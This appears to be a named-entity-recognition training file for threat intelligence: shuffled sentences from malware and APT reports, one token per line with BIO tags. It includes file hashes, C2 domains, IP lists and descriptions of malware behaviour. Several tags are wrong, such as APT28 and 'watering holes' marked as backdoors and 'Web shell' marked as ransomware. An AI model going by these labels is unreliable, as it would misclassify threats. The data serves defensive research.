MESG_SENDER_SWIFT_ADDRESS	O
LIKE	O
'	O
%	O
%	O
%	O
s	O
%	O
%	O
'	O
AND	O
MESG_FIN_CCY_AMOUNT	O
LIKE	O
'	O
%	O
%	O
%	O
s	O
%	O
%	O
'	O
;	O

Value	O
:	O
SysIns	O

Once	O
the	O
new	O
victim	O
click	O
on	O
the	O
APK	O
file	O
,	O
the	O
application	O
installs	O
itself	O
in	O
the	O
device	O
without	O
any	O
problem	O
and	O
is	O
fully	O
functional	O
.	O

Consequently	O
,	O
the	O
attacker	O
contacted	O
us	O
,	O
trying	O
to	O
learn	O
what	O
we	O
know	O
about	O
him	O
.	O

However	O
,	O
we	O
did	O
find	O
Duqu	B-malware.infosteal
files	O
.	O

Beginning	O
in	O
2016	O
,	O
researchers	O
discovered	O
a	O
shift	O
in	O
North	O
Korean	O
operations	O
toward	O
attacks	O
against	O
financial	O
institutions	O
designed	O
to	O
steal	O
money	O
and	O
generate	O
funds	O
for	O
the	O
Kim	O
regime	O
.	O

00	O
00	O
b9	O
?	O
?	O

For	O
the	O
binary	O
mathematically	O
impaired	O
like	O
myself	O
the	O
4-byte	O
keys	O
will	O
eventually	O
repeat	O
in	O
effect	O
creating	O
a	O
256-byte	O
XOR	O
key	O
.	O

When	O
running	O
on	O
Windows	O
7	O
,	O
the	O
malicious	O
library	O
uses	O
the	O
Metasploit	O
Framework	O
's	O
open-source	O
code	O
Win7Elevate	O
to	O
inject	O
malicious	O
code	O
into	O
explorer.exe	O
.	O

The	O
functionality	O
of	O
this	O
part	O
of	O
script	O
is	O
:	O
decrypting	O
the	O
encrypted	O
content	O
of	O
base64	O
,	O
decompressing	O
with	O
Gzip	O
,	O
resulting	O
in	O
module	O
1	O
and	O
using	O
PowerShell	O
to	O
download	O
and	O
execute	O
.	O

Intelligence	O
analysts	O
may	O
want	O
to	O
use	O
the	O
information	O
provided	O
in	O
this	O
IA	O
to	O
better	O
inform	O
their	O
own	O
analyses	O
.	O

%	O
SYSDIR	O
%	O
\Drivers\	O
{	O
93144EB0-8E3E-4591-B307-8EEBFE7DB28F	O
}	O
.sys	O
.	O

On	O
April	O
18	O
,	O
2018	O
,	O
as	O
soon	O
as	O
360	O
Core	O
Security	O
detected	O
the	O
malicious	O
activity	O
,	O
we	O
contacted	O
Microsoft	O
without	O
any	O
delay	O
and	O
submitted	O
relevant	O
details	O
to	O
Microsoft	O
.	O

Related	O
Malware	O
Samples	O
associated	O
with	O
C2	O
(	O
khanji[.]ddns[.]net	B-url.cncsvr
)	O
:	O

At	O
runtime	O
this	O
object	O
is	O
deserialized	O
and	O
stored	O
inside	O
the	O
CORE	O
module	O
.	O

However	O
,	O
we	O
believe	O
the	O
'	O
public	O
release	O
'	O
date	O
is	O
still	O
a	O
good	O
metric	O
,	O
because	O
it	O
is	O
the	O
moment	O
at	O
which	O
all	O
the	O
other	O
security	O
companies	O
and	O
the	O
entire	O
world	O
are	O
made	O
aware	O
of	O
these	O
threats	O
.	O

APT28	B-malware.backdoor
actors	O
relied	O
heavily	O
on	O
shortened	O
URLs	O
in	O
their	O
spearphishing	O
email	O
campaigns	O
.	O

이	O
문서	O
파일은	O
수신자가	O
본문을	O
확인하는데	O
별다른	O
어려움이	O
없어	O
매크로를	O
활성화하지	O
않았을	O
가능성이	O
있다	O
.	O

5a9547b727f0b4baf9b379328c797005	B-hash
Server	O
Platino8	O

IOCS	O
:	O

For	O
threat	O
hunting	O
,	O
iDefense	O
also	O
suggests	O
that	O
analysts	O
to	O
look	O
for	O
the	O
following	O
artifacts	O
:	O
A	O
value	O
named	O
IAStorD	O
in	O
the	O
autorun	O
key	O
A	O
file	O
named	O
FXSAPIDebugLogFile.tmp	O
A	O
mutex	O
handle	O
named	O
donotbotherme	O
thumbcache_1CD60.db	O
in	O
AppData\Local\Microsoft\Windows\Explorer\	O
For	O
further	O
information	O
regarding	O
the	O
Microsoft	O
Security	O
Update	O
KB25533204	O
,	O
please	O
visit	O
:	O
https://support.microsoft.com/en-us/help/2553204/description-of-the-security-update-for-office-2010-november-14-2017	B-url.normal
Given	O
the	O
inherent	O
nature	O
of	O
threat	O
intelligence	O
,	O
the	O
content	O
contained	O
in	O
this	O
alert	O
is	O
based	O
on	O
information	O
gathered	O
and	O
understood	O
at	O
the	O
time	O
of	O
its	O
creation	O
.	O

We	O
discovered	O
that	O
the	O
embedded	O
macro	O
is	O
quite	O
small	O
when	O
extracted	O
.	O

Hacquebord	O
Feike	O
.	O

We	O
'll	O
cover	O
more	O
recent	O
2018	O
change	O
in	O
their	O
targeting	O
and	O
the	O
malware	O
itself	O
at	O
SAS	O
2018	O
.	O

The	O
binary	O
's	O
original	O
name	O
,	O
'	O
Dino.exe	O
'	O
,	O
has	O
been	O
left	O
visible	O
by	O
its	O
authors	O
,	O
as	O
was	O
the	O
case	O
with	O
Casper	B-malware.unknown
.	O

ToString	O
(	O
)	O
;	O
ACTION	O
=	O
'	O
REGISTER	O
'	O
;	O
}	O
Ability	O
to	O
take	O
screenshots	O
.	O

Together	O
,	O
we	O
tried	O
to	O
build	O
a	O
list	O
of	O
features	O
that	O
we	O
could	O
use	O
to	O
make	O
a	O
YARA	O
rule	O
to	O
detect	O
both	O
ExPetr	O
and	O
BlackEnergy	O
wipers	O
.	O

The	O
C	O
&	O
C	O
will	O
reply	O
if	O
it	O
accepts	O
the	O
connection	O
.	O

3	O
Nov	O
.	O

It	O
seems	O
likely	O
that	O
the	O
names	O
used	O
were	O
crafted	O
to	O
make	O
it	O
look	O
like	O
the	O
document	O
came	O
from	O
the	O
Department	O
of	O
Information	O
and	O
Communications	O
Technology	O
(	O
DICT	O
)	O
,	O
or	O
possibly	O
from	O
the	O
Service	O
Director	O
,	O
which	O
would	O
imply	O
that	O
the	O
employees	O
of	O
the	O
Department	O
of	O
Foreign	O
Affairs	O
(	O
DFA	O
)	O
are	O
the	O
target	O
.	O

We	O
use	O
cookies	O
to	O
make	O
your	O
experience	O
of	O
our	O
websites	O
better	O
.	O

We	O
do	O
not	O
have	O
indication	O
that	O
the	O
attacks	O
succeeded	O
in	O
infecting	O
IEC	O
related	O
computers	O
or	O
stealing	O
information	O
.	O

The	O
early	O
samples	O
on	O
the	O
compromised	O
machine	O
could	O
be	O
associated	O
with	O
DarkHotel	O
.	O

niggmhggmeggmkggmfggmdggidggngggmjgg.ijhlokga.dwarduong[.]com	B-url.unknown

64	O
A1	O
30	O
00	O
00	O
00	O
8B	O
40	O
0C	O
8B	O
70	O
1C	O
Push	O
Urlmon	O
string	O
to	O
stack	O
using	O
two	O
push	O
statements	O
.	O

The	O
same	O
information	O
is	O
sent	O
to	O
panel-dark[.]com/Contador/put.php	B-url.unknown
(	O
Figure	O
21	O
)	O
.	O

Strings	O
and	O
code	O
are	O
simple	O
,	O
innovative	O
,	O
and	O
concise	O
.	O

Finally	O
the	O
driver	O
is	O
started	O
using	O
the	O
ZwLoadDriver	O
native	O
API	O
.	O

All	O
future	O
calls	O
to	O
ReadDataBlockValue	O
return	O
the	O
recorded	O
data	O
.	O

Then	O
it	O
was	O
attacked	O
by	O
Lurker	B-malware.backdoor
Trojan	B-malware.backdoor
.	O

Hyundai	O
Merchant	O
Marine	O
is	O
a	O
South	O
Korean	O
logistics	O
company	O
providing	O
worldwide	O
container	O
shipping	O
services	O
.	O

We	O
have	O
offered	O
to	O
help	O
them	O
translate	O
any	O
warning	O
materials	O
into	O
Arabic	O
.	O

This	O
links	O
the	O
previous	O
samples	O
with	O
this	O
unique	O
username	O
.	O

If	O
the	O
process	O
is	O
running	O
with	O
administrator	O
privileges	O
,	O
then	O
the	O
malware	O
achieves	O
persistence	O
by	O
creating	O
a	O
service	O
,	O
else	O
the	O
classic	O
Windows	O
'	O
Run	O
'	O
registry	O
key	O
is	O
used	O
(	O
HKCU\SOFTWARE\Microsoft\	O
Windows\CurrentVersion\Run	O
;	O
DeviceAssociationService;rastlsc.exe	O
)	O
.	O

FinFisher	O
,	O
VUPEN	O
and	O
Hacking	O
Team	O
have	O
all	O
used	O
similar	O
language	O
.	O

Because	O
we	O
are	O
talking	O
about	O
StrongPity	O
watering	B-malware.backdoor
holes	I-malware.backdoor
,	O
let	O
's	O
take	O
a	O
quick	O
look	O
at	O
what	O
is	O
being	O
delivered	O
by	O
the	O
group	O
from	O
these	O
sites	O
.	O

Email	O

REGIONAL	O
HIGH-TECH	O
REGIONAL	O
MANUFACTURING	O

Web	O
.	O

In	O
many	O
cases	O
,	O
the	O
scripts	O
utilized	O
Microsoft	O
OneDrive	O
accounts	O
for	O
data	O
transfer	O
.	O

3cfc7666c97c38f38a3b3ec1d132f2836ade7e	B-hash
6e6e3cddb30b0d7d81682de0b2	I-hash
3e9eab029c52ac34b91f906c8f92ad9059531f	B-hash
825905260023764f8a069edbbf	I-hash
396a684949c96815b54c8e4c2fafbe6324d8c	B-hash
4dde2c9294411658fb5209cd70c	I-hash
1cc7ad407fc87acb9c961105943c87a7bd77c	B-hash
4d4cc90b84b46fb5dcf779b50fd	I-hash
3368b6060d181e39a57759ab9b7f01221e0cd	B-hash
3a397000977aa8bb07a0e6a94ca	I-hash
ca70aa2f89bee0c22ebc18bd5569e542f09d3	B-hash
c4a060b094ec6abeeeb4768a143	I-hash
f94fb5028a81177bb5ea3428349da4d9b125f8	B-hash
1adb658df40d6e8f3ea0e0e3e7	I-hash
cf065e50a5bef24099599af6a60a78c1607a04	B-hash
b21d3573a25ab26bf044a119d6	I-hash
5afa8329c0a159811b55c92303f0d0b9b8834	B-hash
843c76f51777593d414bda5191b	I-hash
77cee0ccc739d3d420e95460c72f7ad2a9846f	B-hash
06e4a7089fb92b8fca4a52ce3f	I-hash

page	O
|	O
11	O

ZxShell	B-malware.backdoor
is	O
one	O
sample	O
amongst	O
several	O
tools	O
that	O
Group	O
72	O
used	O
within	O
their	O
campaign	O
.	O

Mandiant	O
consultants	O
suspect	O
that	O
APT32	B-malware.infosteal
was	O
monitoring	O
web	O
logs	O
to	O
track	O
the	O
public	O
IP	O
address	O
used	O
to	O
request	O
remote	O
images	O
.	O

The	O
attacker	O
might	O
exploit	O
the	O
following	O
ways	O
to	O
control	O
the	O
target	O
host	O
,	O
such	O
as	O
social	O
engineering	O
e-mails	O
,	O
file	O
bundling	O
,	O
exploiting	O
system	O
and	O
application	O
vulneratbilities	O
,	O
lateral	O
movement	O
of	O
intranet	O
and	O
so	O
on	O
.	O

The	O
second	O
big	O
mistake	O
in	O
the	O
implementation	O
of	O
DarkComet	B-malware.backdoor
's	O
HTTP	O
flood	O
attack	O
becomes	O
apparent	O
further	O
down	O
in	O
the	O
attack	O
thread	O
code	O
,	O
just	O
before	O
the	O
(	O
buggy	O
)	O
HTTP	O
request	O
payload	O
is	O
sent	O
to	O
the	O
target	O
via	O
the	O
send	O
(	O
)	O
API	O
:	O

To	O
get	O
the	O
command	O
string	O
malware	O
extracts	O
the	O
string	O
starting	O
from	O
the	O
offset	O
of	O
the	O
string	O
'	O
updatetpermission	O
'	O
+	O
19	O
and	O
extracts	O
a	O
7	O
character	O
length	O
string	O
which	O
it	O
uses	O
as	O
the	O
command	O
string	O
.	O

We	O
wrote	O
a	O
script	O
to	O
extract	O
version	O
info	O
from	O
the	O
binaries	O
we	O
have	O
.	O

It	O
is	O
rare	O
to	O
find	O
a	O
malware	O
written	O
in	O
Delphi	O
language	O
,	O
but	O
previous	O
investigations	O
conducted	O
by	O
other	O
security	O
firms	O
confirm	O
that	O
the	O
APT28	O
group	O
already	O
used	O
malware	O
written	O
in	O
this	O
language	O
in	O
past	O
campaigns	O
.	O

Some	O
of	O
the	O
emails	O
subjects	O
were	O
:	O

The	O
document	O
claims	O
to	O
be	O
a	O
registration	O
form	O
for	O
an	O
event	O
with	O
HDMC	O
,	O
an	O
organization	O
in	O
Vietnam	O
that	O
advertises	O
national	O
independence	O
and	O
democracy	O
.	O

We	O
've	O
seen	O
quite	O
a	O
few	O
versions	O
of	O
these	O
implants	O
,	O
which	O
were	O
relatively	O
widespread	O
at	O
some	O
point	O
or	O
still	O
are	O
.	O

6332	O
Jan	O
01	O
22:53:23	O
2009	O
7061	O
Jul	O
14	O
13:05:31	O
2010	O

The	O
oldest	O
version	O
we	O
identified	O
is	O
G1	O
.	O

The	O
keyboard	O
walk	O
used	O
for	O
the	O
symbols	O
'	O
!	O

37b90673aa83d177767d6289c4b90468	B-hash
Server	O
Platino4	O
C5AapWKh	O
C5AapWKh	O
C5AapWKh	O
C5AapWKh	O

CORE	O

**Xagent	O
versions	O
4-6	O
as	O
seen	O
by	O
VT	O

When	O
this	O
malicious	O
DLL	O
is	O
executed	O
by	O
calling	O
it	O
with	O
its	O
'	O
DllRegisterServer	O
'	O
function	O
,	O
the	O
Victim	O
system	O
establishes	O
a	O
secure	O
and	O
encrypted	O
connection	O
on	O
port	O
443	O
and	O
beacons	O
with	O
the	O
following	O
request	O
(	O
encryption	O
layer	O
removed	O
)	O
.	O

Version	O
4.0	O
Version	O
4.2	O

We	O
have	O
observed	O
multiple	O
probable	O
malware	O
attacks	O
against	O
Israeli	O
and	O
Palestinian	O
targets	O
.	O

A	O
full	O
request	O
looks	O
like	O
:	O

However	O
,	O
the	O
execution	O
and	O
control	O
still	O
can	O
be	O
made	O
depending	O
on	O
system	O
and	O
application	O
vulnerabilities	O
without	O
this	O
leading	O
file	O
.	O

'	O
19A	O
:	O
Amount	O
'	O
'	O
:	O
Debit	O
'	O
'	O
Debit/Credit	O
:	O
'	O
'	O
Sender	O
:	O
'	O
'	O
Amount	O
:	O
'	O
'	O
FEDERAL	O
RESERVE	O
BANK	O
'	O
'	O
D	O
'	O
'	O
C	O
'	O
'	O
62F	O
:	O
'	O
'	O
60F	O
:	O
'	O
'	O
60M	O
:	O
'	O
'	O
62M	O
:	O
'	O
'	O
Credit	O
'	O
'	O
Debit	O
'	O
'	O
64	O
:	O
'	O
'	O
20	O
:	O
Transaction	O
'	O
'	O
90B	O
:	O
Price	O
'	O

Those	O
changes	O
were	O
sparked	O
by	O
advances	O
in	O
code	O
and	O
the	O
need	O
to	O
avoid	O
detection	O
by	O
antivirus	O
solutions	O
.	O

Cobalt	O
Strike	O
is	O
the	O
GUI	O
framework	O
penetration	O
tool	O
based	O
on	O
metasploit	O
.	O

It	O
also	O
implies	O
that	O
IRONGATE	B-malware.backdoor
's	O
purpose	O
was	O
malicious	O
,	O
as	O
opposed	O
to	O
a	O
tool	O
written	O
for	O
other	O
legitimate	O
purposes	O
.	O

29BD1BAC25F753693DF2DDF70B83F0E183D9550D	B-hash
FC92EAC99460FA6F1A40D5A4ACD1B7C3C6647642	I-hash
6609A347932A11FA4C305817A78638E07F04B09F	B-hash

The	O
decryption	O
algorithm	O
of	O
this	O
attack	O
is	O
as	O
follow	O
:	O
The	O
decryption	O
algorithm	O
APT-C-06	O
used	O
is	O
as	O
follow	O
:	O
In	O
the	O
further	O
analysis	O
,	O
we	O
found	O
the	O
same	O
decryption	O
algorithm	O
was	O
used	O
in	O
the	O
64-bit	O
version	O
of	O
the	O
relevant	O
malware	O
.	O

This	O
DLL	O
sends	O
a	O
POST	O
request	O
over	O
the	O
HTTP	O
protocol	O
to	O
communicate	O
.	O

Other	O
functionalities	O
provided	O
by	O
this	O
section	O
of	O
the	O
PowerShell	O
Script	O
are	O
as	O
follows	O
:	O
Retrieves	O
the	O
following	O
data	O
from	O
the	O
system	O
by	O
leveraging	O
Windows	O
Management	O
Instrumentation	O
(	O
WMI	O
)	O
queries	O
and	O
environment	O
variables	O
:	O
IP	O
Address	O
from	O
Network	O
Adapter	O
Configuration	O
OS	O
Name	O
OS	O
Architecture	O
Computer	O
Name	O
Computer	O
Domain	O
Name	O
Username	O
All	O
of	O
this	O
data	O
is	O
concatenated	O
and	O
formatted	O
as	O
shown	O
in	O
Figure	O
13	O
:	O
Register	O
the	O
victim	O
's	O
machine	O
to	O
the	O
C2	O
server	O
by	O
sending	O
the	O
REGISTER	O
command	O
to	O
the	O
server	O
.	O

Identity.p12	O
:	O
This	O
is	O
another	O
certificate	O
,	O
which	O
points	O
to	O
an	O
apparent	O
reference	O
to	O
Russia	O
by	O
using	O
another	O
mail.ru	O
address	O
.	O

may	O
be	O
a	O
Sharepoint	O
user	O
account	O
whilst	O
scomadmin	O
likely	O
corresponds	O
to	O
System	O
Center	O
Operations	O
Manager	O
admin	O
–	O
an	O
account	O
for	O
managing	O
machines	O
in	O
a	O
data	O
centre	O
.	O

The	O
authors	O
wish	O
to	O
give	O
special	O
thanks	O
VirusTotal	O
,	O
Joe	O
Security	O
,	O
Hex-Rays	O
,	O
and	O
Passive	O
Total	O
for	O
providing	O
access	O
to	O
their	O
software	O
and	O
services	O
.	O

The	O
third	O
technique	O
uses	O
the	O
Win32_Computer	O
entry	O
in	O
WMI	O
.	O

It	O
consists	O
of	O
two	O
parts	O
:	O
payload	O
and	O
configuration	O
.	O

DWORD3	O
==	O
~DWORD0	O
DWORD8	O
==	O
ROR	O
(	O
DWORD0	O
,	O
7	O
)	O

During	O
Operation	O
Cobalt	O
Kitty	O
,	O
the	O
attackers	O
compromised	O
more	O
than	O
40	O
PCs	O
and	O
servers	O
,	O
including	O
the	O
domain	O
controller	O
,	O
file	O
servers	O
,	O
Web	O
application	O
server	O
and	O
database	O
server	O
.	O

4	O
It	O
also	O
uses	O
Wave	O
APIs	O
to	O
capture	O
audio	O
.	O

But	O
he	O
or	O
she	O
managed	O
to	O
stay	O
under	O
the	O
radar	O
since	O
2016	O
.	O

The	O
update.exe	B-malware.drop
dropper	O
includes	O
a	O
check	O
for	O
VMware	O
instead	O
of	O
Cuckoo	O
.	O

We	O
filtered	O
out	O
all	O
non-XtremeRAT	O
traffic	O
and	O
ensured	O
that	O
each	O
of	O
the	O
12000	O
IPs	O
attempted	O
to	O
make	O
an	O
XtremeRAT	B-malware.backdoor
connection	O
.	O

Background	O

Its	O
a	O
.php-script	O
named	O
config.inc	O
,	O
containing	O
variables	O
which	O
look	O
familiar	O
from	O
Babar	O
's	O
config	O
such	O
as	O
'	O
user	O
'	O
,	O
'	O
id	O
'	O
or	O
'	O
seq	O
'	O
,	O
but	O
also	O
a	O
handful	O
of	O
comments	O
from	O
the	O
authors	O
.	O

Server.csr	O
:	O
In	O
this	O
certificate	O
,	O
the	O
attacker	O
mentioned	O
Hrvatska	O
(	O
'	O
Croatia	O
'	O
in	O
the	O
Croatian	O
language	O
)	O
with	O
the	O
same	O
Russian	O
email	O
.	O

Notes	O
:	O
Executable	O
file	O
downloaded	O
by	O
Java	O
Applet	O
that	O
has	O
been	O
encoded	O
with	O
XOR	O
0Ã—99	O
Taking	O
a	O
closer	O
look	O
at	O
the	O
resulting	O
executable	O
we	O
have	O
,	O
it	O
turns	O
out	O
it	O
is	O
a	O
newer	O
sample	O
of	O
PlugX	O
.	O

This	O
tool	O
is	O
responsible	O
for	O
stealing	O
information	O
—	O
specifically	O
the	O
environment	O
information	O
—	O
within	O
the	O
target	O
system	O
.	O

:	O
D	O
STR	O

case	O
'	O
f	O
'	O
:	O

testfile.exe	O
)	O
as	O
shown	O
below	O
.	O

It	O
is	O
however	O
interesting	O
to	O
note	O
the	O
hostnames	O
some	O
of	O
these	O
connect	O
to	O
–	O
like	O
'	O
terroristttt.no-ip.biz	B-url.unknown
'	O
.	O

/research/threat-group-4127-targets-hillary-clinton-presidential-campaign	B-url.normal
SecureWorks	O
Counter	O
Threat	O
UnitTM	O
Threat	O
Intelligence	O
16	O
June	O
2016	O
SecureWorks	O
Counter	O
Threat	O
UnitTM	O
(	O
CTU	O
)	O
researchers	O
track	O
the	O
activities	O
of	O
Threat	O
Group-4127	O
(	O
TG-4127	B-malware.infosteal
)	O
,	O
which	O
targets	O
governments	O
,	O
military	O
,	O
and	O
international	O
non-governmental	O
organizations	O
(	O
NGOs	O
)	O
.	O

Execute	O
a	O
command	O
,	O
redirect	O
its	O
output	O
to	O
the	O
file	O
%	O
TEMP%\~D%random%.tmp	O
.	O

AutoIt	O
Script	O

To	O
maximize	O
physical	O
impact	O
,	O
a	O
cyber	O
attacker	O
would	O
also	O
need	O
to	O
bypass	O
safety	O
controls	O
.	O

Service	O
names	O
:	O

Tariq	O
Masud	O

On	O
each	O
iteration	O
of	O
the	O
loop	O
,	O
DarkComet	B-malware.backdoor
will	O
process	O
a	O
pair	O
of	O
two	O
source	O
bytes	O
to	O
yield	O
one	O
output	O
byte	O
.	O

ChessMaster	O
can	O
utilize	O
any	O
of	O
these	O
methods	O
to	O
download	O
the	O
next	O
malware	O
in	O
the	O
chain	O
,	O
the	O
open	O
source	O
post-exploitation	O
tool	O
known	O
as	O
'	O
Koadic	B-malware.unknown
,	O
'	O
which	O
the	O
previous	O
campaign	O
also	O
used	O
.	O

[	O
그림	O
20	O
]	O
Zcon.exe	O
안다리엘	O
그룹은	O
Crash.exe	O
,	O
Test.exe라는	O
이름의	O
악성코드를	O
제작했는데	O
,	O
이들	O
악성코드는	O
매년	O
8월	O
이후	O
하	O
드디스크	O
내용을	O
파괴하는	O
기능을	O
갖고	O
있다	O
.	O

Figure	O
6	O
shows	O
the	O
extracted	O
NBIs	O
.	O

Figure	O
3	O
.	O

Call	O
path	O
determined	O
and	O
embedded	O
in	O
network	O
beacon	O

'	O
US	O
Superstars	O
Serena	O
and	O
Venus	O
Williams	O
and	O
Simone	O
Biles	O
Given	O
Drugs	O
Exemption	O
,	O
Russian	O
Hackers	O
Reveal	O
.	O
'	O

The	O
loader	O
DLL	O
is	O
responsible	O
for	O
decrypting	O
and	O
injecting	O
the	O
core	O
payload	O
DLL	O
into	O
memory	O
,	O
from	O
an	O
encrypted	O
 le	O
present	O
on	O
disk	O
.	O

The	O
information	O
exfiltrated	O
is	O
then	O
leveraged	O
by	O
a	O
company	O
front	O
to	O
blackmail	O
victim	O
companies	O
into	O
contracting	O
the	O
Poseidon	B-malware.infosteal
Group	O
as	O
a	O
security	O
firm	O
.	O

Once	O
on	O
the	O
SIS	O
network	O
,	O
the	O
attacker	O
used	O
their	O
pre-built	O
TRITON	B-malware.infosteal
attack	O
framework	O
to	O
interact	O
with	O
the	O
SIS	O
controllers	O
using	O
the	O
TriStation	O
protocol	O
.	O

lasted	O
10	O
seconds	O
.	O

FBI	O
:	O

Many	O
of	O
these	O
individuals	O
held	O
communications	O
,	O
media	O
,	O
finance	O
,	O
or	O
policy	O
roles	O
.	O

This	O
word	O
is	O
derived	O
from	O
the	O
Spanish	O
word	O
chinche	O
,	O
meaning	O
pest	O
.	O

If	O

siCreateTime	O
(	O
UTC	O
)	O
6/6/2013	O
16:01	O
2/21/2003	O
22:48	O
siAccessTime	O
(	O
UTC	O
)	O
6/20/2013	O
1:41	O
6/25/2013	O
18:56	O
siModTime	O
(	O
UTC	O
)	O
6/7/2013	O
0:33	O
2/21/2003	O
22:48	O
siMFTModTime	O
(	O
UTC	O
)	O
6/20/2013	O
1:54	O
6/25/2013	O
18:56	O
fnCreateTime	O
(	O
UTC	O
)	O
6/6/2013	O
16:01	O
6/6/2013	O
16:01	O
fnAccessTime	O
(	O
UTC	O
)	O
6/6/2013	O
16:03	O
6/6/2013	O
16:03	O
fnModTime	O
(	O
UTC	O
)	O
6/4/2013	O
15:42	O
6/4/2013	O
15:42	O
fnMFTModTime	O
(	O
UTC	O
)	O
6/6/2013	O
16:04	O
6/6/2013	O
16:04	O

T	O
he	O
diversity	O
of	O
victims	O
may	O
indicate	O
the	O
diversity	O
of	O
the	O
attackers	O
'	O
interests	O
.	O

?	O
?	O

A	O
brief	O
timeline	O
of	O
this	O
activity	O
is	O
shown	O
in	O
Figure	O
1	O
.	O

A	O
national	O
data	O
center	O
is	O
a	O
valuable	O
source	O
of	O
data	O
that	O
can	O
also	O
be	O
abused	O
to	O
compromise	O
official	O
websites	O
.	O

zxFunction001	O
modifies	O
the	O
current	O
process	O
memory	O
,	O
uses	O
data	O
contained	O
in	O
the	O
named	O
pipe	O
to	O
create	O
a	O
socket	O
,	O
and	O
then	O
executes	O
the	O
code	O
that	O
sends	O
the	O
remote	O
desktop	O
session	O
to	O
the	O
server	O
controller	O
.	O

The	O
following	O
will	O
present	O
detailed	O
information	O
about	O
some	O
of	O
the	O
phishing	O
emails	O
observed	O
and	O
the	O
attached	O
malware	O
:	O

The	O
network	O
protocol	O
of	O
the	O
backdoor	O
is	O
well	O
described	O
by	O
JPCERT	O
,	O
but	O
Cylance	O
has	O
taken	O
the	O
liberty	O
to	O
clean	O
up	O
their	O
original	O
python	O
snippet	O
,	O
which	O
was	O
provided	O
for	O
decoding	O
the	O
cookie	O
values	O
:	O

Canada	O
Canada	O
217.16.xxx.xxx	B-ip.unknown
PIPNI	O
VPS	O
Czech	O
Republic	O
217.146.xxx.xxx	B-ip.unknown
Zone	O
Media	O
UVS/Nodes	O
213.55.99.74	B-ip.unknown
Ethio	O
Telecom	O
80.156.xxx.xxx	B-ip.unknown
Gamma	O
International	O
GmbH	O
37.200.xxx.xxx	B-ip.unknown
JiffyBox	O
Servers	O
Estonia	O
Estonia	O
Germany	O
Germany	O
178.77.xxx.xxx	B-ip.unknown
HostEurope	O
GmbH	O
Germany	O
119.18.xxx.xxx	B-ip.unknown
HostGator	O
119.18.xxx.xxx	B-ip.unknown
HostGator	O
118.97.xxx.xxx	B-ip.unknown
PT	O
Telkom	O
118.97.xxx.xxx	B-ip.unknown
PT	O
Telkom	O
103.28.xxx.xxx	B-ip.unknown
PT	O
Matrixnet	O
Global	O
112.78.143.34	B-ip.unknown
Biznet	O
ISP	O
112.78.143.26	B-ip.unknown
Biznet	O
ISP	O
187.188.xxx.xxx	B-ip.unknown
Iusacell	O
PCS	O
201.122.xxx.xxx	B-ip.unknown
UniNet	O
164.138.xxx.xxx	B-ip.unknown
164.138.28.2	B-ip.unknown
Tilaa	O
Tilaa	O
78.100.57.165	B-ip.unknown
Qtel	O
–	O
Government	O
Relations	O
195.178.xxx.xxx	B-ip.unknown
Tri.d.o.o	O
/	O
Telekom	O
Srbija	O
India	O
India	O
Indonesia	O
Indonesia	O
Indonesia	O
Indonesia	O
Indonesia	O
Malaysia	O
Mexico	O
Mexico	O
Netherlands	O
Netherlands	O
Qatar	O
Serbia	O
Singapore	O
217.174.229.82	B-ip.unknown
Ministry	O
of	O
Communications	O
Turkmenistan	O
72.22.xxx.xxx	B-ip.unknown
iPower	O
,	O
Inc	O
.	O

The	O
traffic	O
shown	O
in	O
blue	O
at	O
the	O
bottom	O
is	O
the	O
response	O
from	O
the	O
target	O
(	O
Web	B-malware.ransom
shell	O
)	O
.	O

Background	O

This	O
allows	O
an	O
attacker	O
to	O
hide	O
their	O
communication	O
within	O
a	O
cluster	O
of	O
network	O
sessions	O
originating	O
from	O
a	O
single	O
IP	O
such	O
as	O
would	O
be	O
the	O
case	O
for	O
a	O
client	O
performing	O
multiple	O
HTTP	O
requests	O
against	O
a	O
web	O
server	O
.	O

It	O
analyses	O
new	O
attacks	O
by	O
Molerats	O
against	O
targets	O
in	O
Israel	O
,	O
The	O
United	O
States	O
,	O
Egypt	O
,	O
Saudi	O
Arabia	O
,	O
United	O
Arab	O
Emirates	O
and	O
The	O
Palestinian	O
Authority	O
.	O

Probing	O
Confucius	O
'	O
infrastructure	O
,	O
we	O
came	O
across	O
websites	O
offering	O
Windows	O
and	O
Android	O
chat	O
applications	O
,	O
most	O
likely	O
iterations	O
of	O
its	O
predecessor	O
,	O
Simple	O
Chat	O
Point	O
:	O
Secret	O
Chat	O
Point	O
,	O
and	O
Tweety	B-malware.backdoor
Chat	I-malware.backdoor
.	O

Sancho	O
,	O
David	O
;	O
Dela	O
Torre	O
,	O
Jessa	O
;	O
Bakuei	O
,	O
Matsukawa	O
;	O
Villeneuve	O
,	O
Nart	O
;	O
and	O
McArdle	O
,	O
Robert	O
.	O

Office	O
Document	O
with	O
Embedded	B-malware.backdoor
Flash	I-malware.backdoor
Using	O
Remote	O
Inclusion	O
:	O
The	O
document	O
utilized	O
in	O
the	O
attack	O
utilizes	O
an	O
uncommon	O
method	O
of	O
embedding	O
Flash	O
and	O
such	O
methods	O
,	O
particularly	O
from	O
untrusted	O
sources	O
,	O
should	O
be	O
considered	O
suspicious	O
.	O

Among	O
the	O
organizations	O
we	O
counted	O
,	O
11	O
are	O
based	O
in	O
South	O
Korea	O
and	O
two	O
entities	O
reside	O
in	O
China	O
.	O

Victims	O
in	O
the	O
USA	O
are	O
situated	O
in	O
several	O
states	O
,	O
including	O
Nevada	O
(	O
Las	O
Vegas	O
)	O
,	O
California	O
,	O
and	O
New	O
York	O
,	O
and	O
include	O
casinos	O
and	O
hotels	O
.	O

The	O
malware	O
sets	O
up	O
a	O
scheduled	O
task	O
that	O
checks	O
if	O
chrome	O
is	O
already	O
running	O
,	O
every	O
minute	O
,	O
if	O
it	O
is	O
n't	O
,	O
it	O
will	O
'	O
silent-launch	O
'	O
it	O
as	O
you	O
can	O
see	O
in	O
the	O
following	O
screenshot	O
:	O

Even	O
when	O
these	O
samples	O
are	O
shared	O
among	O
companies	O
or	O
via	O
other	O
services	O
like	O
VirusTotal	O
some	O
malware	O
samples	O
can	O
go	O
unnoticed	O
for	O
months	O
because	O
they	O
are	O
marked	O
as	O
malware	O
but	O
given	O
some	O
generic	O
name	O
,	O
such	O
as	O
'	O
Win.Trojan.Agent	O
'	O
.	O

iDefense	O
assesses	O
with	O
high	O
confidence	O
that	O
this	O
campaign	O
is	O
associated	O
with	O
the	O
threat	O
group	O
DRAGONFISH	O
(	O
also	O
known	O
as	O
Lotus	O
Blossom	O
and	O
Spring	O
Dragon	O
)	O
.	O

To	O
sell	O
the	O
botnet	B-malware.ransom
malware	O
,	O
the	O
author	O
used	O
a	O
quite	O
sexy	O
marketing	O
flyer	O
,	O
but	O
,	O
